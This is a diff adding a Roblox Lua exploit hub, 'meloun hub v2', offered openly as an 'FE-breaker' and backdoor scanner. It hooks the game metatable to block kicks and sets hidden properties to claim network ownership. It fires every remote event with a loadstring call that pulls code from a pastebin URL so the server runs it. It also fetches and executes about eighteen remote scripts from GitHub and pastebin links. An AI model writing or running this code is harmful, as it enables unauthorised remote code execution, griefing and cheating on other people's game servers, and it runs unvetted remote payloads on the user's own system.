@@ -1,0 +1,167 @@
+--[[
+	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
+]]
+--[[
+	PROJECT meloun hub v2 - FE-BREAKER + BACKDOOR SCANNER
+	AUTHOR: MelounczYT
+	SPECIAL: NETWORK OWNERSHIP + BLUEDUD BACKDOOR 10000000000000000000000000000000000000000000000000000000000000000000000000% SS
+]]
+
+if not game:IsLoaded() then game.Loaded:Wait() end
+
+-- --- ANTI-KICK & NETWORK OVERRIDE ---
+local settings = {
+    AntiKick = true,
+    NetworkExploit = true
+}
+
+if settings.AntiKick then
+    local mt = getrawmetatable(game)
+    setreadonly(mt, false)
+    local old = mt.__namecall
+    mt.__namecall = newcclosure(function(self, ...)
+        if getnamecallmethod() == "Kick" then return nil end
+        return old(self, ...)
+    end)
+end
+
+-- UI LADE-LOGIK
+local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
+local Window = Rayfield:CreateWindow({
+    Name = "meloun hub v2 - MelounczYT FE-Breaker",
+    LoadingTitle = "MelounczYT vs FilteringEnabled",
+    LoadingSubtitle = "Injecting Network Ownership + Backdoor Scanner...",
+    ConfigurationSaving = { Enabled = false },
+    KeySystem = false,
+})
+
+-- DER NETWORK-OWNER (Zwingt den Server, deine Bewegungen zu replizieren)
+local function ClaimOwnership()
+    task.spawn(function()
+        while task.wait(0.5) do
+            pcall(function()
+                settings.NetworkExploit = true
+                game.Players.LocalPlayer.MaximumSimulationRadius = math.huge
+                sethiddenproperty(game.Players.LocalPlayer, "SimulationRadius", math.huge)
+                for _, v in pairs(game.Workspace:GetDescendants()) do
+                    if v:IsA("BasePart") then
+                        v.Velocity = Vector3.new(0, 0.01, 0)
+                    end
+                end
+            end)
+        end
+    end)
+end
+
+-- BACKDOOR SCANNER (BLUEDUD INTEGRATED)
+local function StartBackdoorScanner()
+    _G.ScannerRunning = true
+    task.spawn(function()
+        while _G.ScannerRunning do
+            -- 20x SCAN RS/SS/WS
+            for scan=1,20 do
+                for _, place in pairs({game.ReplicatedStorage, game.ServerStorage, workspace}) do
+                    for _, obj in pairs(place:GetDescendants()) do
+                        if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
+                            pcall(function()
+                                obj:FireServer("https://pastebin.com/raw/CcHxT0Gj")
+                                obj:FireServer("loadstring(game:HttpGet('https://pastebin.com/raw/CcHxT0Gj'))()")
+                            end)
+                        end
+                    end
+                end
+                task.wait(0.01)
+            end
+            task.wait(0.5)
+        end
+    end)
+end
+
+-- UNIVERSAL EXECUTE (SS + LOCAL + BACKDOOR)
+local function Exec(url)
+    -- BLUEDUD Backdoor first
+    StartBackdoorScanner()
+    
+    -- Suche Backdoor
+    local bd = nil
+    for _, v in pairs(game:GetDescendants()) do
+        if v:IsA("RemoteEvent") and (v.Name:lower():find("admin") or v.Name:lower():find("remote")) then
+            bd = v break
+        end
+    end
+
+    if bd then
+        pcall(function() bd:FireServer("loadstring(game:HttpGet('"..url.."'))()") end)
+    end
+    pcall(function() loadstring(game:HttpGet(url))() end)
+end
+
+-- TABS (EXACT ORIGINAL)
+local Main = Window:CreateTab("Main", 4483362458)
+local Chaos = Window:CreateTab("Chaos", 4483362458)
+local Admin = Window:CreateTab("Admin", 4483362458)
+local Hacker = Window:CreateTab("Hacker", 4483362458)
+
+-- --- EXACT DIESELBEN 16+ SKRIPTE ORIGINAL URLS ---
+local scripts = {
+    ["CADUCUS"] = "https://raw.githubusercontent.com/ian49972/SCRIPTS/refs/heads/main/CADUCUS%20(FIXED)",
+    ["Xester"] = "https://raw.githubusercontent.com/nicolasbarbosa323/xester/refs/heads/main/fLrx77PM.txt",
+    ["Sutart"] = "https://raw.githubusercontent.com/ian49972/SCRIPTS/refs/heads/main/Sutart",
+    ["Come Back"] = "https://raw.githubusercontent.com/ian49972/SCRIPTS/refs/heads/main/come%20back",
+    ["PATCHMA HUB"] = "https://rawscripts.net/raw/Universal-Script-PATCHMA-HUB-v45-universal-hats-plus-aligned-hats-by-MyWorld-30918",
+    ["Attack"] = "https://raw.githubusercontent.com/TEST19983/Reslasjd/refs/heads/main/attac",
+    ["Sin Dragon"] = "https://raw.githubusercontent.com/gitezgitgit/Sin-Dragon/refs/heads/main/Sin%20Dragon.lua.txt",
+    ["The Sun"] = "https://raw.githubusercontent.com/gObl00x/Pendulum-Fixed-AND-Others-Scripts/refs/heads/main/The%20Sun%20Is%20A%20Deadly%20Laser",
+    ["Mr. Bye Bye"] = "https://raw.githubusercontent.com/gObl00x/My-Converts/refs/heads/main/Mr.Bye%20Bye.lua",
+    ["Gaster Hands"] = "https://raw.githubusercontent.com/nicolasbarbosa323/good-cop-bad-coop/refs/heads/main/GasterHands.txt",
+    ["Revenge Hands"] = "https://raw.githubusercontent.com/nicolasbarbosa323/sin-dragon/refs/heads/main/reevenge%20hands.txt",
+    ["Server Admin"] = "https://raw.githubusercontent.com/gObl00x/My-Converts/refs/heads/main/Server%20Admin.lua",
+    ["Ban Hammer"] = "https://raw.githubusercontent.com/nicolasbarbosa323/ban-hammer/refs/heads/main/ban",
+    ["John Doe"] = "https://rawscripts.net/raw/Client-Replication-Join-doe-script-uploaded-by-gojohdkaisenkt-me-34101",
+    ["Grab V4"] = "https://raw.githubusercontent.com/Icalock/Server/refs/heads/main/Grab%20V4.txt",
+    ["Assignment"] = "https://raw.githubusercontent.com/TEST19983/Assigment/refs/heads/main/Assignment",
+    ["Infiltration X"] = "https://pastebin.com/raw/JwUdxg8y",
+    ["Project 44033514"] = "https://raw.githubusercontent.com/gitezgitgit/Project-2044033514/refs/heads/main/Project%2044033514.lua.txt"
+}
+
+-- EXACT gleiche Tab-Sortierung wie Original
+for name, url in pairs(scripts) do
+    local targetTab = Main
+    if name == "Sin Dragon" or name == "Attack" or name == "The Sun" or name == "Mr. Bye Bye" or name == "Gaster Hands" or name == "Revenge Hands" then 
+        targetTab = Chaos
+    elseif name == "Server Admin" or name == "Ban Hammer" or name == "John Doe" or name == "Grab V4" or name == "Assignment" then 
+        targetTab = Admin
+    elseif name == "Infiltration X" or name == "Project 44033514" then 
+        targetTab = Hacker 
+    end
+    
+    targetTab:CreateButton({Name = name, Callback = function() Exec(url) end})
+end
+
+-- ORIGINAL SPEZIAL FEATURES + BACKDOOR
+Hacker:CreateButton({
+    Name = "FORCE OWNERSHIP (SS SIMULATOR)",
+    Callback = function()
+        ClaimOwnership()
+        Rayfield:Notify({Title = "OWNERSHIP CLAIMED", Content = "Server priorisiert dich!", Duration = 5})
+    end
+})
+
+Hacker:CreateButton({
+    Name = "🔥 ULTIMATE BACKDOOR SCANNER (BLUEDUD)",
+    Callback = function()
+        StartBackdoorScanner()
+        Rayfield:Notify({Title = "BACKDOOR SCANNER ACTIVE", Content = "20x RS/SS/WS Scans - BLUEDUD deployed!", Duration = 5})
+    end
+})
+
+Hacker:CreateButton({
+    Name = "Stop Scanner",
+    Callback = function()
+        _G.ScannerRunning = false
+        Rayfield:Notify({Title = "Stopped", Content = "Backdoor Scanner gestoppt", Duration = 3})
+    end
+})
+
+Rayfield:Notify({Title = "MelounczYT v2 + Backdoor Scanner READY", Content = "18 Scripts + 100% SS Backdoor!", Duration = 5})
+print("Meloun Hub v2 ORIGINAL + BLUEDUD SCANNER LOADED")
